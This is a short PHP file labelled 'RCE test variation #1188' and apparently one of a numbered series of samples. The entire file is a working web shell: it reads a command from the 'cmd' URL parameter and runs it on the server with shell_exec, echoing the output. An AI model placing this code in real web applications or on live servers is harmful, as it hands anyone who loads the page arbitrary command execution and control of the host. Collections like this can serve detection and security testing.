<?php
// RCE test variation #1188
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>